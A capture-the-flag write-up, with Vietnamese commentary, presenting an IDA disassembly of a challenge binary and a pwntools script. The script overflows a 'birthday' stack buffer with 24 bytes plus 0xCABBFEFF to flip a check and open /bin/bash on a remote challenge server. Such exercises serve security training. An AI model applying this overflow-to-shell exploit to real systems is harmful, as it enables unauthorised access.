```asm
.text:0804927F ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0804927F                 public main
.text:0804927F main            proc near               ; DATA XREF: _start+2A↑o
.text:0804927F
.text:0804927F argc            = dword ptr  4
.text:0804927F argv            = dword ptr  8
.text:0804927F envp            = dword ptr  0Ch
.text:0804927F
.text:0804927F ; __unwind {
.text:0804927F                 endbr32
.text:08049283                 lea     ecx, [esp+argc]
.text:08049287                 and     esp, 0FFFFFFF0h
.text:0804928A                 push    dword ptr [ecx-4]
.text:0804928D                 push    ebp
.text:0804928E                 mov     ebp, esp
.text:08049290                 push    ebx
.text:08049291                 push    ecx
.text:08049292                 sub     esp, 20h
.text:08049295                 call    __x86_get_pc_thunk_bx
.text:0804929A                 add     ebx, 2D66h
.text:080492A0                 mov     dword ptr [ebp-0Ch], 0FEEFEFFEh
.text:080492A7                 call    setup
.text:080492AC                 sub     esp, 0Ch
.text:080492AF                 lea     eax, (aTellMeYourBirt - 804C000h)[ebx] ; "Tell me your birthday?"
.text:080492B5                 push    eax
.text:080492B6                 call    sub_80490B0
.text:080492BB                 add     esp, 10h
.text:080492BE                 sub     esp, 4
.text:080492C1                 push    1Eh
.text:080492C3                 lea     eax, [ebp-24h]
.text:080492C6                 push    eax
.text:080492C7                 push    0
.text:080492C9                 call    sub_80490A0
.text:080492CE                 add     esp, 10h
.text:080492D1                 cmp     dword ptr [ebp-0Ch], 0CABBFEFFh
.text:080492D8                 jnz     short loc_80492EE
.text:080492DA                 sub     esp, 0Ch
.text:080492DD                 lea     eax, (aBinBash - 804C000h)[ebx] ; "/bin/bash"
.text:080492E3                 push    eax
.text:080492E4                 call    run_cmd
.text:080492E9                 add     esp, 10h
.text:080492EC                 jmp     short loc_8049300
.text:080492EE ; ---------------------------------------------------------------------------
.text:080492EE
.text:080492EE loc_80492EE:                            ; CODE XREF: main+59↑j
.text:080492EE                 sub     esp, 0Ch
.text:080492F1                 lea     eax, (aBinDate - 804C000h)[ebx] ; "/bin/date"
.text:080492F7                 push    eax
.text:080492F8                 call    run_cmd
.text:080492FD                 add     esp, 10h
.text:08049300
.text:08049300 loc_8049300:                            ; CODE XREF: main+6D↑j
.text:08049300                 mov     eax, 0
.text:08049305                 lea     esp, [ebp-8]
.text:08049308                 pop     ecx
.text:08049309                 pop     ebx
.text:0804930A                 pop     ebp
.text:0804930B                 lea     esp, [ecx-4]
.text:0804930E                 retn
.text:0804930E ; } // starts at 804927F
.text:0804930E main            endp
```

Buffer `birthday` nằm ở địa chỉ `ebp - 0x24`, biến `check` nằm ở địa chỉ `ebp - 0xc`. Vậy cần nhập `0x24 - 0xc = 24` bytes để fill hết buffer `birthday`, tiếp theo là 4 ký tự chứa giá trị 0xCABBFEFF.

Get flag script:

```python
from pwn import *

r = remote('61.28.237.24', 30200)
print(r.recvuntil('?'))
r.sendline('a' * 24 + '\xff\xfe\xbb\xca')
print(r.interactive())
```
